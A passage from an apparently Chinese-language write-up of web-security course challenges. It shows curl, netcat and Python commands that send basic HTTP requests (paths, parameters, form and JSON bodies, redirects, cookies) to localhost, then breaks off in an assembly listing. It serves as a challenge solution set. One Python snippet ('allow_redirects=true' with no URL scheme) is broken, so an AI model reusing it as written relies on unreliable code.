class="hljs-string">&quot;9caff40ba2b50555593035fa83ddd063&quot;</span><br><br>headers = &#123;<br>        <span class="hljs-string">&quot;host&quot;</span>:host<br>&#125;<br><br>response = requests.get(url,headers=headers)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><blockquote><p>Set the path in an HTTP request</p></blockquote><h5 id="curl-2"><a href="#curl-2" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80/756549fa99c1d39df50fa0dbc7001b5b</span><br></code></pre></td></tr></table></figure><h5 id="nc-2"><a href="#nc-2" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /dff70448ab02fa153e53c321d12c3e25 HTTP/1.1<br></code></pre></td></tr></table></figure><h5 id="python-2"><a href="#python-2" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80/be21ae3ca3c57337269c87354f7fb58a&quot;</span><br><br>response = requests.get(url)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><blockquote><p>URL encode a path in an HTTP request</p></blockquote><h5 id="curl-3"><a href="#curl-3" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80/468d0524%20a0f46d01/13a2115f%2045f6bf42</span><br></code></pre></td></tr></table></figure><h5 id="nc-3"><a href="#nc-3" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /e834594f%20d12bbc07/45b1bdd9%2077ad1aa4 HTTP/1.1<br></code></pre></td></tr></table></figure><h5 id="python-3"><a href="#python-3" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>base_url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>path = <span class="hljs-string">&quot;/e1467bf6 1173372a/0d30c414 6d22c249&quot;</span><br>url = base_url + quote(path)<br><br>response = requests.get(url)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><blockquote><p>Specify an argument in an HTTP request</p></blockquote><h5 id="curl-4"><a href="#curl-4" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80/?a=21c2593a91c22ea996d92149d6ee1310</span><br></code></pre></td></tr></table></figure><h5 id="nc-4"><a href="#nc-4" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /?a=0c59ad68454000d755026a99dadaa303 HTTP/1.1<br></code></pre></td></tr></table></figure><h5 id="python-4"><a href="#python-4" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br>a = <span class="hljs-string">&quot;1d4f071509297083549435a7d5c7e650&quot;</span><br>params = &#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:a<br>&#125;<br>params = urlencode(params)<br><br>response = requests.get(url,params=params)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h4><blockquote><p>Specify multiple arguments in an HTTP request</p></blockquote><h5 id="curl-5"><a href="#curl-5" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -v -G --data-urlencode <span class="hljs-string">&#x27;a=b40ff87c1dfc9445e66bd1dffd31ecf3&#x27;</span> --data-urlencode <span class="hljs-string">&#x27;b=e9e53eab 8cccb234&amp;d985bc70#d49f0c63&#x27;</span> 127.0.0.1:80</span><br></code></pre></td></tr></table></figure><h5 id="nc-5"><a href="#nc-5" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /?a=01df1fb634dda7a5f27c6c54d072b51d&amp;b=de8950c2%20d91fa17a%2678fc768c%23e848a330 HTTP/1.1<br></code></pre></td></tr></table></figure><h5 id="python-5"><a href="#python-5" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>a=<span class="hljs-string">&quot;7afab61dacb0fca25609fedd696bce30&quot;</span><br>b=<span class="hljs-string">&quot;bb179fab e02b7f2f&amp;3a717740#2fb93639&quot;</span><br><br>params = &#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:a,<br>    <span class="hljs-string">&quot;b&quot;</span>:b<br>&#125;<br>params = urlencode(params)<br><br>response = requests.get(url,params=params)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h4><blockquote><p>Include form data in an HTTP request</p></blockquote><h5 id="curl-6"><a href="#curl-6" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -d <span class="hljs-string">&quot;a=d59caa292e43dd969de6c0d6adebd053&quot;</span></span><br></code></pre></td></tr></table></figure><h5 id="nc-6"><a href="#nc-6" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>POST / HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 34<br><br>a=0a849ab7d1b57ed2f864880911873622<br></code></pre></td></tr></table></figure><h5 id="python-6"><a href="#python-6" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>a = <span class="hljs-string">&#x27;ab3f0e720c694b54bf8fb2e2c4e6c6f5&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:a&#125;<br><br>response = requests.post(url,data)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h4><blockquote><p>Include form data with multiple fields in an HTTP request</p></blockquote><h5 id="curl-7"><a href="#curl-7" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -d <span class="hljs-string">&quot;a=a4431e83e83cae7723c24b83f465475e&quot;</span> --data-urlencode <span class="hljs-string">&quot;b=6100a2f0 e8809d07&amp;587a0ea8#9b1109cd&quot;</span></span><br></code></pre></td></tr></table></figure><h5 id="nc-7"><a href="#nc-7" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>POST / HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 78<br><br>a=b0f2f1b6f49b2896213fb29b3b93a1ef&amp;b=57792821%20bc13e5dc%261426d3c1%23972f7bb8<br></code></pre></td></tr></table></figure><h5 id="python-7"><a href="#python-7" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>a = <span class="hljs-string">&#x27;0b39bf04e5ff6e32c942117af11502ef&#x27;</span><br>b = <span class="hljs-string">&#x27;3856a81d 06f783f6&amp;494c9950#b7a38f82&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>:a,<br>    <span class="hljs-string">&#x27;b&#x27;</span>:b<br>&#125;<br><br>response = requests.post(url,data)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><blockquote><p>Include json data in an HTTP request</p></blockquote><h5 id="curl-8"><a href="#curl-8" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -H <span class="hljs-string">&#x27;Content-Type:application/json&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;a&quot;:&quot;547135c945b35920ab6b764faba0467c&quot;&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure><h5 id="nc-8"><a href="#nc-8" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>POST / HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/json<br>Content-Length: 40<br><br>&#123;&quot;a&quot;:&quot;506924275dda4823072f030cb9e36878&quot;&#125;<br></code></pre></td></tr></table></figure><h5 id="python-8"><a href="#python-8" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>a = <span class="hljs-string">&#x27;b152f0359ac06459241c8d57bcf2a8cb&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>:a,<br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span><br>&#125;<br><br>response = requests.post(url,headers = headers,data=json.dumps(data))<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h4><blockquote><p>Include complex json data in an HTTP request</p></blockquote><h5 id="curl-9"><a href="#curl-9" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -H <span class="hljs-string">&#x27;Content-Type:application/json&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;a&quot;:&quot;afb674d6a6635008d8f123b6db1c7fe1&quot;,&quot;b&quot;:&#123;&quot;c&quot;:&quot;eaa06025&quot;,&quot;d&quot;:[&quot;f3e76d78&quot;,&quot;8897c850 15e64e19&amp;86faa062#707120a5&quot;]&#125;&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure><h5 id="nc-9"><a href="#nc-9" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>POST / HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/json<br>Content-Length: 116<br><br>&#123;&quot;a&quot;:&quot;e0e3ffb1ea8c041f948fd4a52b8b03ef&quot;,&quot;b&quot;:&#123;&quot;c&quot;:&quot;07027b1c&quot;,&quot;d&quot;:[&quot;9caee2fb&quot;,&quot;40d89ef2 c4b79a11&amp;7fa007c8#ccf64a5f&quot;]&#125;&#125;<br></code></pre></td></tr></table></figure><h5 id="python-9"><a href="#python-9" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;6c924b91dc3acbfe942f9a313d81c607&quot;</span>,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;9b0456d0&quot;</span>,<br>        <span class="hljs-string">&quot;d&quot;</span>:[<br>            <span class="hljs-string">&quot;96f87ee7&quot;</span>,<br>            <span class="hljs-string">&quot;1e81e83f 35de65b4&amp;ecedb67b#29d8d3c2&quot;</span><br>        ]<br>    &#125;<br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span><br>&#125;<br><br>response = requests.post(url,headers = headers,data=json.dumps(data))<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><blockquote><p>Follow an HTTP redirect from HTTP response</p></blockquote><h5 id="curl-10"><a href="#curl-10" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -L</span><br></code></pre></td></tr></table></figure><h5 id="nc-10"><a href="#nc-10" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /8987117b1c7a13a67e6ebdab1040b023 HTTP/1.1<br></code></pre></td></tr></table></figure><h5 id="python-10"><a href="#python-10" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br><br><span class="hljs-comment"># &#x27;allow_redirects=true&#x27; is default option, can be removed</span><br>response = requests.get(url,allow_redirects=true)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h4><blockquote><p>Include a cookie from HTTP response</p></blockquote><h5 id="curl-11"><a href="#curl-11" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -v</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 --cookie <span class="hljs-string">&quot;cookie=b0a72e415cbb83c7d2671097074329c0&quot;</span></span><br></code></pre></td></tr></table></figure><h5 id="nc-11"><a href="#nc-11" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Cookie: cookie=4203ce2d43f46581fe45652da89f9310<br></code></pre></td></tr></table></figure><h5 id="python-11"><a href="#python-11" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br><span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> s:<br>    r = s.get(url)<br>    <span class="hljs-built_in">print</span>(r.content)<br><br></code></pre></td></tr></table></figure><h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h4><blockquote><p>Make multiple requests in response to stateful HTTP responses</p></blockquote><h5 id="curl-12"><a href="#curl-12" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -v</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 --cookie <span class="hljs-string">&quot;session=eyJzdGF0ZSI6MX0.ZqI1lw.eBOyNFmp0kEvgn4a1KTi6--ZyvE&quot;</span> -v</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 --cookie <span class="hljs-string">&quot;session=eyJzdGF0ZSI6Mn0.ZqI1vA.zPh9QlVY-OvqFsXUk6IvcmafTBU&quot;</span> -v</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 --cookie <span class="hljs-string">&quot;session=eyJzdGF0ZSI6M30.ZqI2AQ.71jPgAYQa35fYtKd79FZU9l2Omg&quot;</span> -v</span><br></code></pre></td></tr></table></figure><h5 id="nc-12"><a href="#nc-12" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Cookie: session=eyJzdGF0ZSI6MX0.ZqI20w.GYw4a8ICn5uSqs2EPgpS6VPwfmE<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Cookie: session=eyJzdGF0ZSI6Mn0.ZqI4EA.ZyJQGgplU-tBR8ZmkGnhwt9-fWE<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Cookie: session=eyJzdGF0ZSI6M30.ZqI4NA.G_jGq5vQx6fd2HY3SgqzG95ZXo4<br></code></pre></td></tr></table></figure><h5 id="python-12"><a href="#python-12" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br><span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> s:<br>    r = s.get(url)<br>    <span class="hljs-built_in">print</span>(r.content)<br></code></pre></td></tr></table></figure><h2 id="building-a-web-server"><a href="#building-a-web-server" class="headerlink" title="building-a-web-server"></a>building-a-web-server</h2><h3 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h3><p>这是最终的程序</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span 